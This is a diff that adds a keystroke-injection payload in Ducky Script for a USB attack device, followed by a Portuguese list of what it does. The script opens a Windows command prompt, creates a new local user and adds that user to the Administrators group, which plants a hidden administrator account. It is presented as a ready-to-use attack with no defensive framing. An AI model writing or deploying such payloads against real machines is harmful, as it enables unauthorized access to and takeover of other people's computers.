@@ -1,0 +1,31 @@
+DELAY 1000 
+GUI r 
+DELAY 500 
+STRING cmd 
+DELAY 500 
+ENTER 
+DELAY 1000 
+STRING whoami /user 
+DELAY 500 
+ENTER 
+DELAY 1000 
+STRING net user [USERNAME] [PASSWORD] /add 
+DELAY 500 
+ENTER 
+DELAY 1000 
+STRING net localgroup Administrators [USERNAME] /add 
+DELAY 500 
+ENTER 
+DELAY 1000 
+STRING exit 
+DELAY 500 
+ENTER 
+
+Este script fará o seguinte:
+
+    Abrir a janela de Executar (tecla Windows + R)
+    Abrir um prompt de comando
+    Usar o comando "whoami" para exibir o usuário atual
+    Usar o comando "net user" para adicionar um novo usuário com o nome de usuário e senha especificados
+    Adicionar o novo usuário ao grupo de Administradores
+    Fechar o prompt de comando
